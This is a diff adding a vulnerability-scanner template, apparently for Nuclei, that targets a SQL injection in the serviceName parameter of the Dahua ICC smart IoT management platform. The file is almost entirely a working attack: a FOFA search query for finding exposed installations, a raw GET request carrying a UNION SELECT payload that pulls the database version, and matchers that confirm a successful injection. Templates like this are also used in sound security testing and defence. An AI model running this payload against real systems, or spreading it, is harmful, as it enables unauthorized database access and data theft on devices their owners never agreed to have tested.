@@ -1,0 +1,27 @@
+id: dahua-iot-platform-servicename-sqli
+
+info:
+  name: 大华智能物联管理平台 serviceName 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+          大华ICC智能物联综合管理平台通过模块化架构实现技术组件解耦，分层分级的解决方案设计增强了智慧物联数据接入与生态协作能力。经分析发现，该平台同时存在任意文件读取漏洞与SQL注入漏洞。其中evo-apigw/evo-arsm/1.0.0/ars/list接口因未正确过滤用户输入参数，允许攻击者通过构造恶意SQL语句实施注入攻击，可能造成数据库敏感数据泄露或操作被篡改。
+  tags: 大华智能物联管理平台
+
+http:
+- raw:
+  - |
+    GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'serviceIP'
